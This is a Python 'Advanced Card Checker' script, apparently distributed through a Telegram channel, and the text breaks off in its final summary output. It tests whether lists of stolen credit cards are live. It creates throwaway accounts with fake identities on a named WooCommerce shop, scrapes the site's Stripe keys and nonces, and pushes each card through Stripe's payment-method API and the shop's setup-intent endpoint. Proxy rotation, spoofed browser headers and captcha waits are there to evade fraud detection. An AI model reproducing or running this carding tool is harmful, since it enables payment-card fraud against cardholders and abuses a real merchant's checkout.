import os
import sys
import re
import time
import random
import json
import uuid
import string
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from datetime import datetime
import brotli
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock, Semaphore
from collections import deque
import hashlib

# ------------------------------------------------------------
# Initialize colorama FIRST
# ------------------------------------------------------------
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    class Fore:
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        RESET = '\033[0m'
    
    class Back:
        RED = '\033[101m'
        GREEN = '\033[102m'
        YELLOW = '\033[103m'
        BLUE = '\033[104m'
        MAGENTA = '\033[105m'
        CYAN = '\033[106m'
        WHITE = '\033[107m'
        RESET = '\033[0m'
    
    class Style:
        RESET_ALL = '\033[0m'
        BRIGHT = '\033[1m'
        DIM = '\033[2m'

# ------------------------------------------------------------
# Configuration
# ------------------------------------------------------------
TELEGRAM_BOT_TOKEN = "YOUR_TOKEN_BOT"
TELEGRAM_CHAT_ID = None
DEVELOPER = "@xghost123"
CHANNEL = "https://t.me/wolfstoren"
WELCOME_VIDEO_URL = "https://t.me/HoTmIlToOLs/38"

# Rate limiting configuration
RATE_LIMIT_DELAY = 3  # seconds between requests per thread
MAX_RETRIES = 3
RETRY_DELAY = 5  # seconds between retries

# Proxy configuration
PROXIES = []  # Will be loaded from file
USE_PROXY = False
PROXY_ROTATION = "round_robin"  # round_robin, random, failover
PROXY_FILE = None

# User agents pool
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
]

# Email domains with good reputation
EMAIL_DOMAINS = ['@gmail.com', '@outlook.com', '@hotmail.com', '@protonmail.com', '@icloud.com', '@yahoo.com']

# Global variables for thread safety
print_lock = Lock()
approved_lock = Lock()
approved_cards = []
stats = {"total": 0, "approved": 0, "declined": 0, "errors": 0, "rate_limited": 0}
rate_limiter = Semaphore(3)  # Max 3 concurrent requests
proxy_counter = 0
proxy_lock = Lock()
working_proxies = []
failed_proxies = []

# ------------------------------------------------------------
# ASCII Art and UI Elements
# ------------------------------------------------------------
def get_ascii_art():
    """Return cool ASCII art for the header."""
    return f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                                      ║
║  ███████╗████████╗██████╗ ██╗██████╗ ███████╗     ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗
║  ██╔════╝╚══██╔══╝██╔══██╗██║██╔══██╗██╔════╝    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝
║  ███████╗   ██║   ██████╔╝██║██████╔╝█████╗      ██║     ███████║█████╗  ██║     █████╔╝ 
║  ╚════██║   ██║   ██╔══██╗██║██╔═══╝ ██╔══╝      ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ 
║  ███████║   ██║   ██║  ██║██║██║     ███████╗    ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗
║  ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝     ╚══════╝     ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝
║                                                                                      ║
║                         {Fore.YELLOW}⚡ ADVANCED CARD CHECKER v2.0 ⚡{Fore.CYAN}                         ║
║                                                                                      ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║  {Fore.GREEN}Developer:{Fore.WHITE} {DEVELOPER:<45} {Fore.GREEN}Channel:{Fore.WHITE} {CHANNEL:<35} {Fore.CYAN}║
╚══════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""

def show_banner():
    """Display the main banner."""
    os.system('cls' if os.name == 'nt' else 'clear')
    print(get_ascii_art())
    print()

def show_loading_animation():
    """Display a loading animation."""
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    for char in chars:
        sys.stdout.write(f'\r{Fore.YELLOW} {char} Initializing Stripe Checker... {Fore.RESET}')
        sys.stdout.flush()
        time.sleep(0.05)
    print()

def show_progress_bar(current, total, width=50):
    """Display a nice progress bar."""
    if total == 0:
        return
    percentage = current / total
    filled = int(width * percentage)
    bar = f"{Fore.GREEN}{'█' * filled}{Fore.RED}{'░' * (width - filled)}{Fore.RESET}"
    percent = f"{Fore.CYAN}{percentage:.1%}{Fore.RESET}"
    sys.stdout.write(f'\rProgress: [{bar}] {percent} ({current}/{total})')
    sys.stdout.flush()

def show_card_result(card, status, msg="", is_approved=False):
    """Display card result with nice formatting."""
    n, mm, yy, cvc = card
    masked = f"{n[:6]}******{n[-4:]}|{mm}|{yy[-2:]}|{cvc}"
    
    if status == "APPROVED":
        print(f"\n{Fore.GREEN}┌─────────────────────────────────────────────────────────┐")
        print(f"│ {Fore.GREEN}✅ APPROVED {Fore.WHITE}» {masked}")
        print(f"│ {Fore.GREEN}💳 BIN: {Fore.WHITE}{n[:6]} {Fore.GREEN}🌐 Status: {Fore.WHITE}Live Card")
        print(f"│ {Fore.GREEN}⏱️  Time: {Fore.WHITE}{datetime.now().strftime('%H:%M:%S')}")
        print(f"{Fore.GREEN}└─────────────────────────────────────────────────────────┘{Fore.RESET}")
    elif status == "DECLINED":
        print(f"\n{Fore.RED}┌─────────────────────────────────────────────────────────┐")
        print(f"│ {Fore.RED}❌ DECLINED {Fore.WHITE}» {masked}")
        print(f"│ {Fore.RED}📝 Reason: {Fore.WHITE}{msg[:45]}")
        print(f"{Fore.RED}└─────────────────────────────────────────────────────────┘{Fore.RESET}")
    else:
        print(f"\n{Fore.YELLOW}┌─────────────────────────────────────────────────────────┐")
        print(f"│ {Fore.YELLOW}⚠️  ERROR {Fore.WHITE}» {masked}")
        print(f"│ {Fore.YELLOW}📝 Error: {Fore.WHITE}{msg[:45]}")
        print(f"{Fore.YELLOW}└─────────────────────────────────────────────────────────┘{Fore.RESET}")

# ------------------------------------------------------------
# Proxy Management Functions
# ------------------------------------------------------------
def load_proxies_from_file(filename):
    """Load proxies from a text file."""
    proxies = []
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    # Support multiple proxy formats
                    if '://' not in line:
                        line = f'http://{line}'
                    proxies.append(line)
        return proxies
    except Exception as e:
        print(f"{Fore.RED} ✗ Error loading proxies: {e}{Fore.RESET}")
        return []

def test_proxy(proxy):
    """Test if a proxy is working."""
    try:
        test_session = requests.Session()
        test_session.proxies = {"http": proxy, "https": proxy}
        test_session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
        response = test_session.get('http://httpbin.org/ip', timeout=10)
        if response.status_code == 200:
            return True
        return False
    except:
        return False

def validate_proxies(proxies, max_test=10):
    """Validate a list of proxies and return working ones."""
    print(f"\n{Fore.YELLOW} 🔍 Testing proxies (this may take a moment)...{Fore.RESET}")
    working = []
    test_count = min(len(proxies), max_test)
    
    for i, proxy in enumerate(proxies[:test_count]):
        sys.stdout.write(f'\r Testing proxy {i+1}/{test_count}...')
        sys.stdout.flush()
        if test_proxy(proxy):
            working.append(proxy)
    
    print(f"\n{Fore.GREEN} ✓ {len(working)}/{test_count} proxies are working{Fore.RESET}")
    return working

def get_proxy():
    """Get next proxy from pool."""
    if not working_proxies or not USE_PROXY:
        return None
    
    global proxy_counter
    with proxy_lock:
        if PROXY_ROTATION == "round_robin":
            proxy = working_proxies[proxy_counter % len(working_proxies)]
            proxy_counter += 1
        elif PROXY_ROTATION == "random":
            proxy = random.choice(working_proxies)
        else:
            proxy = working_proxies[0]
        
        return {"http": proxy, "https": proxy}

def report_proxy_failure(proxy):
    """Report a failed proxy to be removed from pool."""
    if proxy in working_proxies:
        working_proxies.remove(proxy)
        failed_proxies.append(proxy)
        with print_lock:
            print(f"\n{Fore.YELLOW} ⚠️ Proxy failed, removed from pool. {len(working_proxies)} remaining{Fore.RESET}")

# ------------------------------------------------------------
# Helper functions
# ------------------------------------------------------------
def send_telegram_message(message):
    """Send plain text message via Telegram."""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        resp = requests.post(url, json=data, timeout=10)
        return resp.status_code == 200
    except Exception:
        return False

def send_telegram_video(video_url, caption):
    """Send a video by URL to Telegram."""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendVideo"
        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "video": video_url,
            "caption": caption,
            "parse_mode": "HTML"
        }
        resp = requests.post(url, json=data, timeout=15)
        return resp.status_code == 200
    except Exception:
        return False

def setup_session(use_proxy=True):
    """Create a requests session with retries, headers, and optional proxy."""
    session = requests.Session()
    
    # Configure retries with exponential backoff
    retry = Retry(
        total=MAX_RETRIES,
        backoff_factor=RETRY_DELAY,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "POST", "OPTIONS"]
    )
    adapter = HTTPAdapter(max_retries=retry, pool_connections=10, pool_maxsize=20)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    
    # Random user agent
    ua = random.choice(USER_AGENTS)
    session.headers.update({
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Cache-Control': 'max-age=0',
    })
    
    # Add proxy if enabled
    if use_proxy and USE_PROXY:
        proxy = get_proxy()
        if proxy:
            session.proxies.update(proxy)
    
    return session

def generate_email():
    """Generate a realistic email address."""
    patterns = [
        lambda: f"{''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 10)))}{random.randint(100, 999)}{random.choice(EMAIL_DOMAINS)}",
        lambda: f"{random.choice(['john', 'jane', 'mike', 'sarah', 'david', 'emma', 'alex', 'sofia'])}{random.randint(10, 999)}{random.choice(EMAIL_DOMAINS)}",
        lambda: f"{''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 6)))}.{''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 6)))}{random.randint(10, 99)}{random.choice(EMAIL_DOMAINS)}",
        lambda: f"user{random.randint(1000, 9999)}{random.choice(EMAIL_DOMAINS)}",
        lambda: f"{random.choice(['tech', 'dev', 'coder', 'hacker', 'pro'])}{random.randint(100, 999)}{random.choice(EMAIL_DOMAINS)}",
    ]
    return random.choice(patterns)()

def generate_password():
    """Generate a strong random password."""
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    return ''.join(random.choices(chars, k=random.randint(12, 16)))

def luhn_check(card_number):
    """Validate card number using Luhn algorithm."""
    def digits_of(n):
        return [int(d) for d in str(n)]
    
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10 == 0

def get_card_bin_info(card_number):
    """Get basic card info from BIN."""
    bin_num = card_number[:6]
    card_types = {
        '4': 'Visa',
        '5': 'Mastercard',
        '3': 'Amex',
        '6': 'Discover',
    }
    card_type = card_types.get(card_number[0], 'Unknown')
    
    # Additional BIN info
    bin_db = {
        '4': {'name': 'Visa', 'type': 'Credit/Debit'},
        '5': {'name': 'Mastercard', 'type': 'Credit/Debit'},
        '34': {'name': 'American Express', 'type': 'Credit'},
        '37': {'name': 'American Express', 'type': 'Credit'},
        '6': {'name': 'Discover', 'type': 'Credit/Debit'},
    }
    
    return {
        'bin': bin_num,
        'type': card_type,
        'length': len(card_number),
    }

def rate_limited_request(session, method, url, **kwargs):
    """Make a request with rate limiting and retry logic."""
    with rate_limiter:
        delay = random.uniform(RATE_LIMIT_DELAY, RATE_LIMIT_DELAY + 2)
        time.sleep(delay)
        
        for attempt in range(MAX_RETRIES):
            try:
                response = session.request(method, url, timeout=20, **kwargs)
                
                if response.status_code == 429:
                    wait_time = RETRY_DELAY * (attempt + 1)
                    with print_lock:
                        print(f"\n{Fore.YELLOW}⚠️ Rate limited! Waiting {wait_time}s...{Fore.RESET}")
                    time.sleep(wait_time)
                    continue
                
                response.raise_for_status()
                return response
                
            except requests.exceptions.ProxyError as e:
                if USE_PROXY and session.proxies:
                    with print_lock:
                        print(f"\n{Fore.YELLOW}⚠️ Proxy error, rotating...{Fore.RESET}")
                    # Report proxy failure
                    proxy_url = session.proxies.get('http', '')
                    if proxy_url:
                        report_proxy_failure(proxy_url)
                    # Get new proxy for next attempt
                    new_proxy = get_proxy()
                    if new_proxy:
                        session.proxies.update(new_proxy)
                    if attempt < MAX_RETRIES - 1:
                        time.sleep(RETRY_DELAY * (attempt + 1))
                        continue
                raise
                
            except requests.exceptions.RequestException as e:
                if attempt == MAX_RETRIES - 1:
                    raise
                time.sleep(RETRY_DELAY * (attempt + 1))
                continue

def check_card(card_data, thread_id=0):
    """Process one card with enhanced error handling."""
    n, mm, yy, cvc = card_data
    session = None
    
    try:
        # Validate card first
        if not luhn_check(n):
            return "DECLINED", "Invalid card number (Luhn check failed)", card_data
        
        session = setup_session()
        time.sleep(random.uniform(1, 3))
        
        # Step 1: Get registration page
        reg_page = rate_limited_request(session, 'GET', 'https://meddentalstuff.com/my-account/')
        soup = BeautifulSoup(reg_page.text, 'html.parser')
        
        # Check for reCAPTCHA
        if 'recaptcha' in reg_page.text.lower() or 'captcha' in reg_page.text.lower():
            with print_lock:
                print(f"\n{Fore.YELLOW}⚠️ reCAPTCHA detected! Waiting before retry...{Fore.RESET}")
            time.sleep(random.uniform(10, 15))
            session = setup_session()
            reg_page = rate_limited_request(session, 'GET', 'https://meddentalstuff.com/my-account/')
            soup = BeautifulSoup(reg_page.text, 'html.parser')
        
        # Find registration nonce
        register_nonce = None
        nonce_selectors = [
            {'name': 'woocommerce-register-nonce'},
            {'id': 'woocommerce-register-nonce'},
            {'name': '_wpnonce'},
            {'name': 'woocommerce-register-nonce-field'}
        ]
        
        for selector in nonce_selectors:
            nonce_tag = soup.find('input', selector)
            if nonce_tag:
                register_nonce = nonce_tag.get('value')
                break
        
        if not register_nonce:
            scripts = soup.find_all('script')
            for script in scripts:
                if script.string and 'nonce' in script.string:
                    nonce_match = re.search(r'nonce["\']?\s*:\s*["\']([^"\']+)["\']', script.string)
                    if nonce_match:
                        register_nonce = nonce_match.group(1)
                        break
        
        if not register_nonce:
            return "FAIL", "Could not find registration nonce", card_data
        
        # Generate realistic user data
        mail = generate_email()
        password = generate_password()
        first_name = random.choice(['John', 'Mike', 'David', 'Sarah', 'Emma', 'James', 'Lisa', 'Robert', 'Maria', 'Carlos'])
        last_name = random.choice(['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez'])
        
        # Prepare registration data
        reg_data = {
            'email': mail,
            'password': password,
            'first_name': first_name,
            'last_name': last_name,
            'woocommerce-register-nonce': register_nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
            'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'wc_order_attribution_session_count': str(random.randint(1, 5)),
            'wc_order_attribution_session_entry': time.strftime('%Y-%m-%d %H:%M:%S'),
        }
        
        # Submit registration
        time.sleep(random.uniform(0.5, 1.5))
        reg_response = rate_limited_request(session, 'POST', 'https://meddentalstuff.com/my-account/', data=reg_data)
        
        # Check registration success
        if 'woocommerce-error' in reg_response.text:
            soup_err = BeautifulSoup(reg_response.text, 'html.parser')
            err_msg = soup_err.find('ul', class_='woocommerce-error')
            if err_msg:
                error_text = err_msg.get_text(strip=True)
                if 'already exists' in error_text.lower():
                    mail = generate_email()
                    reg_data['email'] = mail
                    reg_response = rate_limited_request(session, 'POST', 'https://meddentalstuff.com/my-account/', data=reg_data)
                elif 'recaptcha' in error_text.lower():
                    return "FAIL", "reCAPTCHA verification required", card_data
                else:
                    return "FAIL", f"Registration failed: {error_text[:50]}", card_data
        
        # Step 2: Go to add payment method page
        time.sleep(random.uniform(1, 2))
        payment_page = rate_limited_request(session, 'GET', 'https://meddentalstuff.com/my-account/add-payment-method/')
        payment_soup = BeautifulSoup(payment_page.text, 'html.parser')
        
        # Extract Stripe configuration
        nonce, key, acc_id = None, None, None
        script_tags = payment_soup.find_all('script')
        
        for script in script_tags:
            if script.string:
                if 'wcpay_upe_config' in script.string:
                    try:
                        json_match = re.search(r'wcpay_upe_config\s*=\s*({.+?});', script.string)
                        if json_match:
                            config = json.loads(json_match.group(1))
                            nonce = config.get('createSetupIntentNonce')
                            key = config.get('publishableKey')
                            acc_id = config.get('accountId')
                            break
                    except:
                        pass
                
                if not nonce:
                    nonce_match = re.search(r'"createSetupIntentNonce":"([^"]+)"', script.string)
                    if nonce_match:
                        nonce = nonce_match.group(1)
                
                if not key:
                    key_match = re.search(r'"publishableKey":"([^"]+)"', script.string)
                    if key_match:
                        key = key_match.group(1)
                
                if not acc_id:
                    acc_id_match = re.search(r'"accountId":"([^"]+)"', script.string)
                    if acc_id_match:
                        acc_id = acc_id_match.group(1)
        
        if not nonce or not key:
            return "FAIL", "Could not extract Stripe configuration", card_data
        
        # Step 3: Create payment method
        time.sleep(random.uniform(1, 2))
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': random.choice(USER_AGENTS),
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        
        sessionid = str(uuid.uuid4())
        guid = str(uuid.uuid4())
        muid = str(uuid.uuid4())
        sid = str(uuid.uuid4())
        time_on_page = random.randint(30000, 120000)
        
        stripe_data = (
            f"billing_details[name]={first_name} {last_name}&billing_details[email]={mail}"
            f"&billing_details[address][country]=US&billing_details[address][postal_code]={random.randint(10000, 99999)}"
            f"&billing_details[address][state]={random.choice(['CA', 'NY', 'TX', 'FL', 'IL', 'PA', 'OH', 'GA'])}"
            f"&billing_details[address][city]={random.choice(['Los Angeles', 'New York', 'Houston', 'Miami', 'Chicago', 'Dallas', 'Atlanta'])}"
            f"&billing_details[address][line1]={random.randint(100, 9999)} {random.choice(['Main St', 'Broadway', 'Park Ave', 'Oak St', 'Maple Ave'])}"
            f"&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}"
            f"&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F2dcfccda05%3B+stripe-js-v3%2F2dcfccda05%3B+payment-element%3B+deferred-intent"
            f"&referrer=https%3A%2F%2Fmeddentalstuff.com&time_on_page={time_on_page}"
            f"&client_attribution_metadata[client_session_id]={sessionid}"
            f"&client_attribution_metadata[merchant_integration_source]=elements"
            f"&client_attribution_metadata[merchant_integration_subtype]=payment-element"
            f"&client_attribution_metadata[merchant_integration_version]=2021"
            f"&client_attribution_metadata[payment_intent_creation_flow]=deferred"
            f"&client_attribution_metadata[payment_method_selection_flow]=merchant_specified"
            f"&client_attribution_metadata[elements_session_config_id]=8f2dd842-031b-4412-bcc5-bb7b38fb7f1b"
            f"&guid={guid}&muid={muid}&sid={sid}&key={key}&_stripe_account={acc_id}"
        )
        
        stripe_resp = rate_limited_request(session, 'POST', 'https://api.stripe.com/v1/payment_methods',
                                          headers=stripe_headers, data=stripe_data)
        stripe_json = stripe_resp.json()
        pm_id = stripe_json.get('id')
        
        if not pm_id:
            error = stripe_json.get('error', {})
            error_msg = error.get('message', 'Unknown error')
            error_code = error.get('code', '')
            
            if error_code in ['incorrect_number', 'invalid_number']:
                return "DECLINED", "Invalid card number", card_data
            elif error_code == 'expired_card':
                return "DECLINED", "Card expired", card_data
            elif error_code == 'insufficient_funds':
                return "DECLINED", "Insufficient funds", card_data
            elif error_code == 'card_declined':
                return "DECLINED", "Card declined", card_data
            elif 'fraud' in error_msg.lower():
                return "DECLINED", "Suspected fraud", card_data
            else:
                return "DECLINED", error_msg, card_data
        
        # Step 4: Add payment method to account
        time.sleep(random.uniform(1, 2))
        from requests_toolbelt.multipart.encoder import MultipartEncoder
        multipart_data = MultipartEncoder({
            'action': 'create_setup_intent',
            'wcpay-payment-method': pm_id,
            '_ajax_nonce': nonce,
        })
        
        ajax_headers = {
            'authority': 'meddentalstuff.com',
            'accept': '*/*',
            'content-type': multipart_data.content_type,
            'origin': 'https://meddentalstuff.com',
            'referer': 'https://meddentalstuff.com/my-account/add-payment-method/',
            'user-agent': random.choice(USER_AGENTS),
            'x-requested-with': 'XMLHttpRequest',
        }
        
        ajax_resp = rate_limited_request(session, 'POST', 'https://meddentalstuff.com/wp-admin/admin-ajax.php',
                                        headers=ajax_headers, data=multipart_data)
        
        content_encoding = ajax_resp.headers.get('Content-Encoding', '')
        if content_encoding == 'br':
            content = brotli.decompress(ajax_resp.content).decode('utf-8')
        else:
            content = ajax_resp.text
        
        if '"success":true' in content or '"success":True' in content:
            return "APPROVED", None, card_data
        else:
            match = re.search(r'"message"\s*:\s*"([^"]+)"', content)
            msg = match.group(1) if match else "Unknown error"
            return "DECLINED", msg, card_data
    
    except requests.exceptions.Timeout:
        return "ERROR", "Request timeout", card_data
    except requests.exceptions.ProxyError as e:
        return "ERROR", f"Proxy error: {str(e)[:30]}", card_data
    except requests.exceptions.RequestException as e:
        if '429' in str(e):
            with approved_lock:
                stats["rate_limited"] += 1
            return "ERROR", "Rate limited", card_data
        return "ERROR", f"Network error: {str(e)[:50]}", card_data
    except Exception as e:
        return "ERROR", f"Unexpected error: {str(e)[:50]}", card_data
    finally:
        if session:
            session.close()

def process_card_wrapper(card_data, thread_id):
    """Wrapper for check_card with proper error handling."""
    status, msg, card = check_card(card_data, thread_id)
    
    with print_lock:
        if status == "APPROVED":
            show_card_result(card, "APPROVED")
            with approved_lock:
                approved_cards.append(card)
                stats["approved"] += 1
        elif status == "DECLINED":
            show_card_result(card, "DECLINED", msg)
            with approved_lock:
                stats["declined"] += 1
        else:
            show_card_result(card, "ERROR", msg)
            with approved_lock:
                stats["errors"] += 1
    
    return status, msg, card

# ------------------------------------------------------------
# Main
# ------------------------------------------------------------
def main():
    global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, USE_PROXY, PROXIES, RATE_LIMIT_DELAY, MAX_RETRIES, working_proxies, PROXY_ROTATION
    
    show_banner()
    show_loading_animation()
    time.sleep(0.5)
    
    # Configuration menu
    print(f"\n{Fore.CYAN}┌─────────────────────────────────────────────────────────┐")
    print(f"│ ⚙️  CONFIGURATION MENU                                        │")
    print(f"└─────────────────────────────────────────────────────────┘{Fore.RESET}")
    
    # File selection
    combo_file = input(f"{Fore.WHITE} 📁 Enter TXT file name: {Fore.YELLOW}").strip()
    
    try:
        with open(combo_file, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED} ✗ File not found!{Fore.RESET}")
        input(f"\n{Fore.YELLOW} Press Enter to exit...{Fore.RESET}")
        return
    
    # Parse and validate cards
    cards = []
    invalid_count = 0
    
    for line in lines:
        parts = line.split('|')
        if len(parts) >= 4:
            n = parts[0].strip()
            mm = parts[1].strip()
            yy = parts[2].strip()
            cvc = parts[3].strip()
            
            if n.isdigit() and len(n) in [15, 16]:
                if len(mm) == 1:
                    mm = f'0{mm}'
                if not yy.startswith('20') and len(yy) == 2:
                    yy = f'20{yy}'
                if cvc.isdigit() and len(cvc) in [3, 4]:
                    if luhn_check(n):
                        cards.append((n, mm, yy, cvc))
                    else:
                        invalid_count += 1
                else:
                    invalid_count += 1
            else:
                invalid_count += 1
        else:
            invalid_count += 1
    
    total_cards = len(cards)
    if total_cards == 0:
        print(f"{Fore.RED} ✗ No valid cards to check!{Fore.RESET}")
        input(f"\n{Fore.YELLOW} Press Enter to exit...{Fore.RESET}")
        return
    
    print(f"{Fore.GREEN} ✓ Valid cards found: {total_cards}")
    if invalid_count > 0:
        print(f"{Fore.YELLOW} ⚠️  Invalid cards skipped: {invalid_count}{Fore.RESET}")
    
    # Thread configuration
    max_threads = min(total_cards, 3)
    thread_input = input(f"{Fore.WHITE} 🧵 Threads (1-{max_threads}, default 2): {Fore.YELLOW}").strip()
    if thread_input.isdigit():
        max_threads = min(int(thread_input), max_threads)
        if max_threads < 1:
            max_threads = 1
    else:
        max_threads = 2
    
    # Rate limit configuration
    delay_input = input(f"{Fore.WHITE} ⏱️  Delay between requests (seconds, default 3): {Fore.YELLOW}").strip()
    if delay_input.replace('.', '').isdigit():
        RATE_LIMIT_DELAY = float(delay_input)
    
    # Proxy configuration
    print(f"\n{Fore.CYAN}┌─────────────────────────────────────────────────────────┐")
    print(f"│ 🌐 PROXY CONFIGURATION (Optional)                             │")
    print(f"└─────────────────────────────────────────────────────────┘{Fore.RESET}")
    proxy_choice = input(f"{Fore.WHITE} Use proxies? (y/n, default n): {Fore.YELLOW}").strip().lower()
    
    if proxy_choice == 'y':
        proxy_file = input(f"{Fore.WHITE} 📁 Enter proxy file name (one per line): {Fore.YELLOW}").strip()
        if proxy_file:
            PROXIES = load_proxies_from_file(proxy_file)
            if PROXIES:
                print(f"{Fore.GREEN} ✓ Loaded {len(PROXIES)} proxies{Fore.RESET}")
                
                # Test proxies
                test_choice = input(f"{Fore.WHITE} Test proxies before use? (y/n, default y): {Fore.YELLOW}").strip().lower()
                if test_choice != 'n':
                    working_proxies = validate_proxies(PROXIES, min(20, len(PROXIES)))
                else:
                    working_proxies = PROXIES.copy()
                
                if working_proxies:
                    USE_PROXY = True
                    print(f"{Fore.GREEN} ✓ Using {len(working_proxies)} working proxies{Fore.RESET}")
                    
                    # Proxy rotation method
                    rot_choice = input(f"{Fore.WHITE} Proxy rotation (round_robin/random, default round_robin): {Fore.YELLOW}").strip().lower()
                    if rot_choice == 'random':
                        PROXY_ROTATION = 'random'
                    else:
                        PROXY_ROTATION = 'round_robin'
                else:
                    print(f"{Fore.RED} ✗ No working proxies found! Continuing without proxies...{Fore.RESET}")
            else:
                print(f"{Fore.YELLOW} ⚠️ No proxies loaded, continuing without proxies...{Fore.RESET}")
    
    # Telegram settings
    print(f"\n{Fore.CYAN}┌─────────────────────────────────────────────────────────┐")
    print(f"│ 📱 TELEGRAM NOTIFICATIONS (Optional)                          │")
    print(f"└─────────────────────────────────────────────────────────┘{Fore.RESET}")
    token_input = input(f"{Fore.WHITE} Bot Token (press Enter to skip): {Fore.YELLOW}").strip()
    if token_input:
        TELEGRAM_BOT_TOKEN = token_input
        chat_id_input = input(f"{Fore.WHITE} Chat ID: {Fore.YELLOW}").strip()
        if chat_id_input:
            TELEGRAM_CHAT_ID = chat_id_input
            print(f"{Fore.GREEN} ✓ Telegram notifications enabled{Fore.RESET}")
    
    # Start checking
    print(f"\n{Fore.GREEN}┌─────────────────────────────────────────────────────────┐")
    print(f"│ 🚀 STARTING CHECKER                                           │")
    print(f"│    Threads: {max_threads}  |  Cards: {total_cards}  |  Delay: {RATE_LIMIT_DELAY}s")
    print(f"│    Proxy: {'ON (' + str(len(working_proxies)) + ' proxies)' if USE_PROXY else 'OFF'}  |  Mode: {'Telegram ON' if TELEGRAM_BOT_TOKEN else 'Telegram OFF'}   │")
    print(f"└─────────────────────────────────────────────────────────┘{Fore.RESET}")
    print(f"\n{Fore.CYAN}═══════════════════════════════════════════════════════════════{Fore.RESET}\n")
    
    stats["total"] = total_cards
    start_time = time.time()
    completed = 0
    
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = []
        for idx, card in enumerate(cards):
            future = executor.submit(process_card_wrapper, card, idx % max_threads)
            futures.append(future)
        
        for future in as_completed(futures):
            completed += 1
            show_progress_bar(completed, total_cards)
            future.result()
    
    elapsed_time = time.time() - start_time
    
    # Display final summary
    print(f"\n\n{Fore.CYAN}═══════════════════════════════════════════════════════════════{Fore.RESET}")
    print(f"""
{Fore.CYAN}╔═══════════════════════════════════════════════════════════════╗
║ {Fore.GREEN}✨ CHECK COMPLETED SUCCESSFULLY {Fore.CYAN}                              ║
╠═══════════════════════════════════════════════════════════════════╣
║ {Fore.GREEN}✅ APPROVED:      {stats['approved']:<5}                                 ║
║ {Fore.RED}❌ DECLINED:       {stats['declined']:<5}                                 ║
